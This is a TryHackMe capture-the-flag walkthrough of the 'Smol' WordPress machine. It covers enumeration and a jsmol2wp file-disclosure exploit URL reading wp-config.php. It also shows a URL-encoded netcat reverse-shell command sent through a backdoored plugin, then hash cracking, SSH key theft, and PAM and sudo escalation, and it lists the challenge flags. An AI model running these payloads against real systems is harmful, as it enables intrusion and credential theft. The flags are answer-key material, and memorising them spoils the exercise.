# Smol - TryHackMe Walkthrough

## 1. Challenge Overview
**Name:** Smol  
**Category:** Boot2Root / Web / WordPress / PrivEsc  
**Difficulty:** Medium  
**Points/Reward:** N/A  
**Challenge Prompt:** 
> At the heart of Smol is a WordPress website, a common target due to its extensive plugin ecosystem. The machine showcases a publicly known vulnerable plugin and a backdoored plugin, highlighting the importance of code inspection.

---

## 2. Setup & Enumeration

**Initial Assessment:** 
We start by adding `smol.thm` and `www.smol.thm` to our `/etc/hosts` file.

**Reconnaissance Tools:**
```bash
nmap -T4 -n -sC -sV -Pn -p- <TARGET_IP>
```

**Key Findings:**
* **Port 22**: SSH (OpenSSH 8.2p1)
* **Port 80**: HTTP (Apache) -> Redirects to `www.smol.thm`

**WordPress Enumeration:**
Using `wpscan` reveals the `jsmol2wp` v1.07 plugin is installed.
```bash
wpscan --url http://www.smol.thm/
```

---

## 3. Exploitation

### Initial Access (www-data)
1. **File Disclosure (CVE-2018-20463)**: The `jsmol2wp` plugin is vulnerable to file disclosure.
   URL: `http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php`
2. **Database Credentials**: The leaked `wp-config.php` contains DB credentials: `wpuser:kb[REDACTED]%G`.
3. **Admin Dashboard**: Use the credentials to log in at `/wp-login.php`.
4. **Backdoor Discovery**: A private page "Webmaster Tasks!!" hints at a backdoor in the `hello.php` (Hello Dolly) plugin.
5. **RCE via Backdoor**: The backdoor uses a `cmd` GET parameter.
   URL: `http://www.smol.thm/wp-admin/?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20<IP>%20<PORT>%20%3E%2Ftmp%2Ff`
6. We get a shell as `www-data`.

---

## 4. Lateral Movement & Privilege Escalation

### User: www-data -> diego
1. Dump the `wp_users` table from MySQL.
2. Crack the hash for `diego`: `$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1` -> `sandiegocalifornia`.
3. `su - diego` and read the user flag.

### User: diego -> think
1. `diego` belongs to the `internal` group, allowing read access to other home directories.
2. Find an SSH private key in `/home/think/.ssh/id_rsa`.
3. `ssh -i id_rsa think@127.0.0.1`.

### User: think -> gege
1. Inspect `/etc/pam.d/su`. A custom rule allows `think` to switch to `gege` without a password:
   `auth sufficient pam_succeed_if.so use_uid user = think`
2. `su - gege`.

### User: gege -> xavi
1. Find `wordpress.old.zip` in `/home/gege`.
2. Transfer to local machine and crack with `john`: `hero_gege@hotmail.com`.
3. Inside the ZIP's `wp-config.php`, find credentials: `xavi:P@[REDACTED]i@`.
4. `su - xavi`.

### User: xavi -> root
1. `sudo -l` reveals `(ALL : ALL) ALL` for `xavi`.
2. `sudo su -` to gain root access.

---

## 5. The Flag

**User Flag:** 
`45edaec653ff9ee06236b7ce72b86963`

**Root Flag:** 
`bf89ea3ea01992353aef1f576214d4e4`

---

## 6. Takeaways & Conclusion

* **Plugin Security**: Old or abandoned WordPress plugins are major entry points.
* **Internal Backdoors**: Even legitimate plugins can be modified to include backdoors.
* **Multi-Step Lateral Movement**: In a hardened environment, you may need to pivot through multiple users by exploiting local misconfigurations (PAM rules, group permissions, leaked keys).
* **Credential Reuse & Weak ZIPs**: Old backups frequently contain valid credentials that users have reused.
